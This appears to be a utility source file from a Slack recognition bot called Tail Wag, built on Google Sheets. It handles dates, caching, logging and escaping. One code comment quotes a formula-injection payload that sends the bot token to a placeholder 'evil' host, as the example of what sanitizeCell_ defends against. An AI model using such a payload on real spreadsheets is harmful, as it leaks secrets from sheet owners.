/**
 * Tail Wag — 01_Util.gs
 * Time keys, caching, logging, and small helpers shared across the app.
 */

var DAY_INDEX = {
  SUNDAY: 0, MONDAY: 1, TUESDAY: 2, WEDNESDAY: 3, THURSDAY: 4, FRIDAY: 5, SATURDAY: 6
};

/** Current Date. Isolated so tests can freeze time. */
function now_() {
  return new Date();
}

/**
 * Formats a date in the configured timezone.
 * @param {Date} d
 * @param {string} pattern Java SimpleDateFormat pattern
 */
function fmt_(d, pattern) {
  return Utilities.formatDate(d, cfgStr_('TIMEZONE') || 'America/Denver', pattern);
}

/**
 * The calendar date in the configured timezone, as a UTC-midnight Date.
 * Working in this "shifted" space keeps week arithmetic free of DST traps.
 * @param {Date} d
 * @return {Date}
 */
function localDay_(d) {
  var parts = fmt_(d, 'yyyy-MM-dd').split('-');
  return new Date(Date.UTC(parseInt(parts[0], 10), parseInt(parts[1], 10) - 1, parseInt(parts[2], 10)));
}

/**
 * Start of the allowance week containing d, as a local-calendar Date.
 * @param {Date} d
 * @return {Date}
 */
function weekStart_(d) {
  var day = localDay_(d);
  var startDow = DAY_INDEX[String(cfgStr_('WEEK_START_DAY') || 'MONDAY').toUpperCase()];
  if (startDow === undefined) startDow = 1;
  var dow = day.getUTCDay();
  var delta = (dow - startDow + 7) % 7;
  return new Date(day.getTime() - delta * 86400000);
}

/**
 * Stable key for the allowance week, e.g. "2026-W38".
 * Weeks are numbered from the week-start day, so the key changes exactly when
 * the allowance resets — which is the only property that matters here.
 * @param {Date=} d
 * @return {string}
 */
function weekKey_(d) {
  var ws = weekStart_(d || now_());
  var year = ws.getUTCFullYear();
  var jan1 = new Date(Date.UTC(year, 0, 1));
  var startDow = DAY_INDEX[String(cfgStr_('WEEK_START_DAY') || 'MONDAY').toUpperCase()];
  if (startDow === undefined) startDow = 1;
  // First week-start on or after Jan 1.
  var firstDelta = (startDow - jan1.getUTCDay() + 7) % 7;
  var firstStart = new Date(jan1.getTime() + firstDelta * 86400000);
  var weekNum;
  if (ws.getTime() < firstStart.getTime()) {
    // Belongs to the trailing week of the previous year.
    return weekKeyForYearEdge_(ws);
  }
  weekNum = Math.floor((ws.getTime() - firstStart.getTime()) / (7 * 86400000)) + 1;
  return year + '-W' + pad2_(weekNum);
}

/** Handles the partial week that straddles New Year. */
function weekKeyForYearEdge_(ws) {
  var year = ws.getUTCFullYear() - 1;
  var jan1 = new Date(Date.UTC(year, 0, 1));
  var startDow = DAY_INDEX[String(cfgStr_('WEEK_START_DAY') || 'MONDAY').toUpperCase()];
  if (startDow === undefined) startDow = 1;
  var firstDelta = (startDow - jan1.getUTCDay() + 7) % 7;
  var firstStart = new Date(jan1.getTime() + firstDelta * 86400000);
  var weekNum = Math.floor((ws.getTime() - firstStart.getTime()) / (7 * 86400000)) + 1;
  return year + '-W' + pad2_(weekNum);
}

/** Calendar day key in the configured timezone, e.g. "2026-09-16". */
function dayKey_(d) {
  return fmt_(d || now_(), 'yyyy-MM-dd');
}

/** True when allowances refill daily rather than weekly. */
function isDailyAllowance_() {
  return String(cfgStr_('ALLOWANCE_PERIOD') || 'week').toLowerCase().indexOf('day') === 0;
}

/**
 * The key identifying the current allowance period. This is the single place
 * the daily-vs-weekly choice is resolved; everything downstream just compares
 * keys, so switching cadence mid-flight is safe — the next give sees a
 * different key, rolls the balance forward and refills.
 * @param {Date=} d
 */
function periodKey_(d) {
  return isDailyAllowance_() ? dayKey_(d) : weekKey_(d);
}

/** The key of the period before the one containing d. */
function prevPeriodKey_(d) {
  var base = d || now_();
  if (isDailyAllowance_()) {
    // localDay_ already returns the local calendar date as a UTC-midnight Date,
    // so step back in that shifted space and read the parts straight off it.
    // Re-formatting through the timezone would land on the wrong day at any
    // offset of +12 or more, where UTC noon is already tomorrow locally.
    var prev = new Date(localDay_(base).getTime() - 86400000);
    return prev.getUTCFullYear() + '-' + pad2_(prev.getUTCMonth() + 1) + '-' + pad2_(prev.getUTCDate());
  }
  return prevWeekKey_(base);
}

/** Human label for the allowance period: "week" or "day". */
function periodWord_() {
  return isDailyAllowance_() ? 'day' : 'week';
}

/** When the current allowance period ends, as friendly text. */
function periodResetText_() {
  if (isDailyAllowance_()) return 'midnight tonight';
  var startDay = String(cfgStr_('WEEK_START_DAY') || 'MONDAY');
  var pretty = startDay.charAt(0) + startDay.slice(1).toLowerCase();
  return pretty + ' morning';
}

/** Month key, e.g. "2026-09". */
function monthKey_(d) {
  return fmt_(d || now_(), 'yyyy-MM');
}

/** Previous month key relative to d. */
function prevMonthKey_(d) {
  var base = d || now_();
  var y = parseInt(fmt_(base, 'yyyy'), 10);
  var m = parseInt(fmt_(base, 'MM'), 10);
  m -= 1;
  if (m === 0) { m = 12; y -= 1; }
  return y + '-' + pad2_(m);
}

/** Previous week key relative to d. */
function prevWeekKey_(d) {
  var ws = weekStart_(d || now_());
  return weekKey_(new Date(ws.getTime() - 3 * 86400000));
}

function pad2_(n) {
  return (n < 10 ? '0' : '') + n;
}

/** ISO-8601 timestamp string. */
function iso_(d) {
  return (d || now_()).toISOString();
}

/** Short random identifier for ledger rows. */
function newId_() {
  return 'od_' + Utilities.getUuid().replace(/-/g, '').slice(0, 16);
}

// ---------------------------------------------------------------------------
// Cache
// ---------------------------------------------------------------------------

var CACHE_PREFIX = 'od.v1.';

/**
 * How long each cached thing lives, in seconds. 21600 is the platform maximum.
 *
 * These are long on purpose. Every one of them is dropped by whatever writes to
 * it — a give drops the leaderboards and the stats, a roster sync drops the
 * roster, a Config edit drops the config — so a long life can never serve a
 * stale answer. What a short life bought was a cold read of three or four tabs
 * on almost every command, because a team gives a handful of tailwags a day and
 * ten minutes is a long time between them. That read came out of the three
 * seconds Slack allows, which is how a command ends up timing out. warmCaches()
 * keeps these filled on a schedule so nobody waits for them.
 */
var CACHE_TTL = {
  DEFAULT: 300,
  CONFIG: 21600,
  ROSTER: 21600,
  HEADER: 21600,
  BALANCE_INDEX: 21600,
  LEADERBOARD: 21600,
  STATS: 21600,
  PROFILE: 86400,
  CHANNEL: 86400,
  MESSAGE_CLAIM: 21600
};

function cacheGet_(key) {
  try {
    var raw = CacheService.getScriptCache().get(CACHE_PREFIX + key);
    return raw ? JSON.parse(raw) : null;
  } catch (e) {
    return null;
  }
}

function cachePut_(key, value, ttlSeconds) {
  try {
    CacheService.getScriptCache().put(CACHE_PREFIX + key, JSON.stringify(value), ttlSeconds || CACHE_TTL.DEFAULT);
  } catch (e) {
    // Caching is an optimization; never let it break a request.
  }
}

function cacheDrop_(key) {
  try {
    CacheService.getScriptCache().remove(CACHE_PREFIX + key);
  } catch (e) { /* ignore */ }
}

function cacheDropAll_() {
  ['config', 'roster', 'balances.index', 'stats',
    'leaderboard.period', 'leaderboard.week', 'leaderboard.day',
    'leaderboard.month', 'leaderboard.all'].forEach(cacheDrop_);
  // Header layouts change when the sheet is upgraded, so they must go too.
  ['Config', 'Roster', 'Ledger', 'Balances', 'Badges', 'Raffle', 'Events', 'Pods', 'Tickets', 'Winners']
    .forEach(function (name) { cacheDrop_('header.' + name); });
  if (typeof raffleIndexDirty_ === 'function') raffleIndexDirty_();
  if (typeof rewardsCacheDrop_ === 'function') rewardsCacheDrop_();
}

// ---------------------------------------------------------------------------
// Logging
// ---------------------------------------------------------------------------

var LOG_LEVELS = { DEBUG: 10, INFO: 20, WARN: 30, ERROR: 40 };

/**
 * Appends a structured line to the Events tab, subject to LOG_LEVEL.
 * Failures here are swallowed: logging must never take down a request.
 */
function logEvent_(level, type, actor, detail) {
  try {
    var want = LOG_LEVELS[String(cfgStr_('LOG_LEVEL') || 'INFO').toUpperCase()] || 20;
    if ((LOG_LEVELS[level] || 20) < want) return;
    var d = typeof detail === 'string' ? detail : JSON.stringify(detail);
    if (d && d.length > 4000) d = d.slice(0, 4000) + '…';
    sheet_(SHEETS.EVENTS).appendRow([iso_(), level, type, actor || '', d || '']);
  } catch (e) {
    try { console.error('logEvent_ failed: ' + e); } catch (e2) { /* ignore */ }
  }
}

function logInfo_(type, actor, detail) { logEvent_('INFO', type, actor, detail); }
function logWarn_(type, actor, detail) { logEvent_('WARN', type, actor, detail); }
function logError_(type, actor, detail) { logEvent_('ERROR', type, actor, detail); }
function logDebug_(type, actor, detail) { logEvent_('DEBUG', type, actor, detail); }

// ---------------------------------------------------------------------------
// Text helpers
// ---------------------------------------------------------------------------

/**
 * The name for one unit of recognition, singular or plural. The word lives in
 * UNIT_SINGULAR / UNIT_PLURAL on the Config tab, so renaming what a give is
 * called is a config change rather than a deploy.
 */
function wagWord_(n) {
  var one = cfgStr_('UNIT_SINGULAR') || 'tailwag';
  var many = cfgStr_('UNIT_PLURAL') || 'tailwags';
  return Math.abs(n) === 1 ? one : many;
}

/**
 * A run of the trigger emoji, capped so long strings stay readable. Reads
 * EMOJI_TRIGGER so the pictures in a message always match the emoji people
 * type to give — rename the emoji in Config and the whole app follows.
 */
function wagRun_(n) {
  var name = cfgStr_('EMOJI_TRIGGER') || 'jackson';
  var capped = Math.min(n, 10);
  var s = '';
  for (var i = 0; i < capped; i++) s += ':' + name + ':';
  if (n > capped) s += ' ×' + n;
  return s;
}

/** Slack mention markup for a user id. */
function mention_(userId) {
  return '<@' + userId + '>';
}

/** Escapes the handful of characters Slack treats specially in text. */
function escapeSlack_(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Turns Slack's link markup into something a human reads, so a quoted message
 * never shows up as "<@U09TWPG0H7Z>". Mentions become plain "@Name" text rather
 * than live mentions: the reason is quoted back in a channel, in a DM and on the
 * rewards site, and nobody should be pinged three times for being named once.
 *
 * @param {string} text
 * @param {boolean} rosterOnly true resolves ids from the Roster only (no Slack
 *   call), for rendering text that was stored before this existed.
 */
function humanizeMentions_(text, rosterOnly) {
  var s = String(text == null ? '' : text);
  if (s.indexOf('<') === -1) return s;
  return s
    .replace(/<@([UW][A-Z0-9]{2,})\|([^>]+)>/g, function (full, id, label) { return '@' + label; })
    .replace(/<@([UW][A-Z0-9]{2,})>/g, function (full, id) {
      if (rosterOnly) {
        var r = getRoster_()[id];
        var n = r && String(r.display_name || r.real_name || '').trim();
        return n ? '@' + n : '@someone';
      }
      var name = displayName_(id);
      return '@' + (name === id ? 'someone' : name);
    })
    .replace(/<!subteam\^[A-Z0-9]+(?:\|@?([^>]+))?>/g, function (full, label) { return label ? '@' + label.replace(/^@/, '') : '@group'; })
    .replace(/<!(channel|here|everyone)(?:\|[^>]*)?>/g, function (full, which) { return '@' + which; })
    .replace(/<#[CG][A-Z0-9]+(?:\|([^>]*))?>/g, function (full, label) { return label ? '#' + label : '#channel'; })
    .replace(/<((?:https?|mailto):[^>|]+)(?:\|([^>]*))?>/g, function (full, url, label) { return label || url.replace(/^mailto:/, ''); });
}

/** Reverses Slack's own escaping, for text read back out of the API. */
function unescapeSlack_(s) {
  return String(s == null ? '' : s)
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&amp;/g, '&');
}

/** Escapes text for embedding in HTML. */
function escapeHtml_(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/** Truncates with an ellipsis. */
function truncate_(s, n) {
  s = String(s == null ? '' : s);
  return s.length <= n ? s : s.slice(0, n - 1) + '…';
}

/** Ordinal suffix: 1st, 2nd, 3rd… */
function ordinal_(n) {
  var s = ['th', 'st', 'nd', 'rd'];
  var v = n % 100;
  return n + (s[(v - 20) % 10] || s[v] || s[0]);
}

/** Medal emoji for leaderboard positions. */
function rankEmoji_(i) {
  return ['🥇', '🥈', '🥉'][i] || '　';
}

// ---------------------------------------------------------------------------
// Reading values back out of a spreadsheet
// ---------------------------------------------------------------------------

/**
 * Google Sheets does not hand back what you put in. A cell containing
 * "2026-09" or "2026-09-16" is parsed on entry and returned as a Date object,
 * which makes every `String(cell) === key` comparison fail forever — silently
 * zeroing monthly totals and making the raffle believe it has no entries.
 *
 * Columns holding keys are formatted as plain text at setup, which prevents the
 * coercion going forward. These normalizers handle the rest: cells written
 * before the format was applied, and anyone who retypes a cell by hand.
 *
 * @param {*} v the raw cell value
 * @param {string} pattern the shape to restore a Date to
 */
function normKey_(v, pattern) {
  if (v instanceof Date) {
    // Dates parsed from a bare "2026-09-16" are stored at local midnight, so
    // reading UTC parts is what round-trips the original string.
    if (pattern === 'yyyy-MM') {
      return v.getUTCFullYear() + '-' + pad2_(v.getUTCMonth() + 1);
    }
    return v.getUTCFullYear() + '-' + pad2_(v.getUTCMonth() + 1) + '-' + pad2_(v.getUTCDate());
  }
  return String(v === null || v === undefined ? '' : v).trim();
}

/** Normalizes a month cell ("2026-09"). */
function normMonthKey_(v) { return normKey_(v, 'yyyy-MM'); }

/** Normalizes an allowance-period cell — "2026-W38" weekly, "2026-09-16" daily. */
function normPeriodKey_(v) { return normKey_(v, 'yyyy-MM-dd'); }

/**
 * Makes a value safe to write into a cell.
 *
 * Sheets treats a leading =, +, - or @ as the start of a formula, so a reason
 * typed in Slack can become live code running under the sheet owner's account —
 * `=IMPORTDATA("https://evil/?t="&Config!B2)` would post the bot token to a
 * stranger. A leading apostrophe forces the cell to text and is stripped when
 * the value is read back, so the data itself is unchanged.
 */
function sanitizeCell_(v) {
  if (typeof v !== 'string') return v;
  if (v === '') return v;
  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
}

/** Constant-time-ish string comparison, to avoid leaking secrets by timing. */
function safeEqual_(a, b) {
  a = String(a == null ? '' : a);
  b = String(b == null ? '' : b);
  if (a.length !== b.length) return false;
  var diff = 0;
  for (var i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

/** Deterministic-friendly random in [0,1). Isolated so tests can seed it. */
function random_() {
  return Math.random();
}
